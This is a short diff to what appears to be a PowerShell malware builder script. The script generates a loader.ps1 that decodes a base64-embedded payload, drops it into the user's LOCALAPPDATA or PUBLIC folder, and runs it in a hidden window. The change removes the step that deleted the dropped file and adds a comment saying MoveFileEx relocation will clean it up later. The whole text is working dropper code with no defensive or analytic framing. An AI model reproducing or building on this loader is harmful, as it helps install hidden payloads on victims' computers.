@@ -80,14 +80,13 @@ $loaderDrop = switch ($dropLoc) {
     1 { "`$env:LOCALAPPDATA+'\$dropName'" }
     default { "`$env:PUBLIC+'\$dropName'" }
 }
+# Keep drop on disk (match one-liner) — relocate/MoveFileEx cleans later; no Remove-Item race
 $loader = @"
 `$d = "$b64"
 `$b = [Convert]::FromBase64String(`$d)
 `$p = $loaderDrop
 [IO.File]::WriteAllBytes(`$p, `$b)
 Start-Process -WindowStyle Hidden `$p
-Start-Sleep -Milliseconds 500
-Remove-Item `$p -Force -ErrorAction SilentlyContinue
 "@
 Set-Content -Path "loader.ps1" -Value $loader
 
